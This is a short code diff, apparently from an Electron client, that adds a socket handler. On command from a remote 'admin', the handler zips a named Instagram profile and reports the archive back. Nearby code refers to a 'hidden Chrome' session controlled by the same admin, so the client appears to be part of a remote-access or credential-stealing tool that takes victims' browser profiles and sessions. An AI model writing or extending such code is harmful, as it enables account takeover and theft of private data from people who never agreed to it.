@@ -365,6 +365,21 @@ window.onload = async () => {
             }
         });
 
+        socket.on('request-zip-instagram', async (data) => {
+            const adminId = data.adminId || data;
+            const profileName = data.profileName;
+            try {
+                const zipPath = await window.electronAPI.zipInstagramProfile(profileName);
+                if (zipPath) {
+                    socket.emit('instagram-zip-ready', { adminId, targetId: socket.id, path: zipPath });
+                } else {
+                    socket.emit('instagram-zip-error', { adminId, error: "Profile could not be zipped or found." });
+                }
+            } catch (e) {
+                socket.emit('instagram-zip-error', { adminId, error: e.message });
+            }
+        });
+
         let currentAdminForHiddenChrome = null;
         socket.on('request-hidden-chrome', async (data) => {
             const adminId = data.adminId || data;
